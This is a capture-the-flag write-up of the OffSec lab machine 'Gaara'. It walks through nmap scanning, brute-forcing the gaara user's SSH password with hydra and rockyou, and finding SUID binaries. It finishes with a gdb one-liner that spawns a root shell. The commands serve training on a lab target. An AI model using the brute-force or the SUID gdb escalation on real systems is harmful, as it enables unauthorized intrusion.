---
title: "Gaar"
date: 2024-06-13
layout: "simple"
categories: [Offsec]
tags: [Privesc, Boot2root, Hydra]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---

# Introduction
In today's post, we have another easy box from [offsec playgrounds](https://portal.offsec.com/labs/play). The goal here was to use a mix of automated tools to be able to brute the password of a user to get initial foothold. Then we could escalate our privileges using a nice GTFO bin.

Let's learn.

## Enumaration

```shell
cat nmap.txt
# Nmap 7.94SVN scan initiated Thu Apr 25 18:43:07 2024 as: nmap -sVC -T4 -vv -oN nmap.txt 192.168.219.142
Nmap scan report for 192.168.219.142
Host is up, received echo-reply ttl 61 (0.14s latency).
Scanned at 2024-04-25 18:43:08 EAT for 26s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDS8evJ7ywX5kz396YcIuR+rucTJ/OAK1SSpQoyx6Avj3v1/ZeRvikDEBZRZE4KMV4/+LraxOvCIb0rkU98B5WME6IReWvGTbF99x6wc2sDCG5haD5/OI6At8xrEQPV6FL8NqipouEeYXU5lp/aR7vsdJAs/748uo6Xu4xwUWKFit3RvCHAdhuNfXj5bpiWESerc6mjRm1dPIwIUjJb2zBKTMFiVxpl8R3BXRLV7ISaKQwEo5zp8OzfxDF0YQ5WxMSaKu6fsBh/XDHr+m2A7TLPfIJPS2i2Y8EPxymUahuhSq63nNSaaWNdSZwpbL0qCBPdn1jtTjh26fGbmPeFVdw1
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPFPC21nXnF1t6XmiDOwcXTza1K6jFzzUhlI+zb878mxsPin/9KvLlW9up9ECWVVTKbiIieN8cD0rF7wb3EjkHA=
|   256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBprcu3jXo9TbgN5tBKvrojw4OFUkQIH+dITgacg3BLV
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 25 18:43:34 2024 -- 1 IP address (1 host up) scanned in 27.31 seconds
```
Here we go for a simple `nmap` scan.

` nmap -sVC -T4 -vv -oN scan_results.txt <ip> `

Let us break that down.

1. `nmap`: This is the command itself, that works as a network mapper.

2. `-sVC`: We can break this down into two:
    - `-sV`: This option allows the scanner to detect the version of the services running on open ports. It tries to identify the version of the service software running on each port

    - `sC`: This enables the scanner to run a set of default scripts against the target. These scripts are majorly used for more detailed service enumaration and vulerability detection.

3. `-T4`: This option sets the timing to a more aggressive scan. The scanner has 6 timing options ranging from 0 through 5. Example: `-T5` is a very fast scan, at the cost of accuracy.

4. `-vv`: This option increases the details in our output as the scan proceeds.

5. `-oN`: This option specifies the output format and file, guiding the scanner to save the output in a file specified by the user `-oN scan_results.txt`.

You can read more on the official [manual page](https://nmap.org/book/man.html).

As from the output we see that we have two open ports, port 22 and port 80. Port 22 which is used as the default port for secure shell protocol. We also have port 80, used as the default network port for unencrypted web pages using HTTP protocol. With it's secure protocol (HTTPS), default on port 443.

We can begin by visiting the address, and we are met with just a wallpaper. Well I might wanna save you the trouble and just skip the port 80 since it had really nothing and it was just a rabbit hole.

## Hail hydra 
So remember the wallpaper we just saw on the address? Well doing a quick a google search we actually find out that is Gaara, which also happens to be the name of the machine. This could be a leverage point as we can assume that Gaara is a username and we can actually try and bruteforce his password using an automation tool called [hydra](https://github.com/vanhauser-thc/thc-hydra).

![captain-america-avengers](https://gist.github.com/assets/116626767/85523ac5-ad13-4f73-90c1-d9ddb4e26fee)

We will also make use of a very common wordlist file called rockyou that contains millions of common passwords originating from a data breach. These passwords are stored in plaintext and are easily accessible.

`hydra -l <username> -P <path to wordlist> ssh:<ip>`. 

We can break that down real quick:

1. `hydra`: This is the command itself. Hydra is a powerful tool used for password cracking and performing brute force attacks on various services.

2. `-l <username>`: This option specifies the username you want to try to log in as. Replace <username> with the actual username.

3. `-P <path to wordlist>`: This option tells Hydra to use a wordlist file containing possible passwords. Replace <path to wordlist> with the actual path to the wordlist file you want to use. For example, if the wordlist is rockyou.txt and it's located in the current directory, you would use -P ./rockyou.txt.

4. `ssh://<ip>`: This part specifies the service (SSH) and the target IP address you want to attack. Replace <ip> with the actual IP address of the target machine. As earlier stated, SSH is a protocol used to securely connect to remote servers.

```shell
hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.219.142
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-25 19:16:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.219.142:22/
[STATUS] 109.00 tries/min, 109 tries in 00:01h, 14344293 to do in 2193:20h, 13 active
[22][ssh] host: 192.168.219.142   login: gaara   password: *********
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-25 19:18:58

```

Great we get a hit on the password. We have enough to securely login into the machine using the credentials found.

```shell
ssh gaara@192.168.219.142 
gaara@192.168.219.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 25 11:55:14 2024 from 192.168.45.238
gaara@Gaara:~$ 

```

## Privilege Escalation
Well now all that is left is to excalate to higher privileges and own the machine. To do this we can go through some linux privilege escalation techniques. There are several scripts online that might help us to enumarate, but it is still very important to understand what pieces of information to look for and be able to perfom this enumaration manually. 

Several details to look out for include the OS version, kernel version and running services. One effective way to find such vectors is by searching for files with the setuid bit set. Setuid files are executed with the permissions of the file owner, which can often be root. If these files have vulnerabilities, they can be exploited to gain elevated privileges.

We use the following command to find all files with the setuid bit set, which can help us identify these potential privilege escalation opportunities:

`find / -perm -u=s -type f 2>/dev/null`

1. `find /`: The find command starts searching from the root directory (/) and traverses the entire file system.
2. `-perm -u=s`: This option specifies that the find command should look for files with the setuid bit set. The setuid bit (u=s) allows a file to be executed with the permissions of the file owner rather than the user running the file.
3. `-type f`: This restricts the search to regular files. We're not interested in directories or other types of files for this purpose.
4. `2>/dev/null`: This redirects any error messages (such as permission denied errors) to `/dev/null`, effectively silencing them. This helps keep the output clean and focused only on the results we are interested in.

```shell
gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```
From here we now see files that have the setuid bit set. And now we can go over to a pretty neat page called [GTFO](https://gtfobins.github.io/). It contains a list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. Where this binaries can be used to perform various actions such as file read/write operations, privilege escalation and more.

So what is the Setuid? The (set user ID upon execution) bit is a special permission in Unix-like operating systems that allows the users to run an executable with the permissions of the executable's owner. They are particularly useful for programs that need to perform tasks requiring higher privileges than those of the user running the program. Hence can be exploited to do some privilege escalation.

![image](https://gist.github.com/assets/116626767/feae4e1c-53d1-43aa-94a9-cc0c75093eb3)
![image](https://gist.github.com/assets/116626767/feae4e1c-53d1-43aa-94a9-cc0c75093eb3)

## Root
```shell
gaara@Gaara:~$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
```
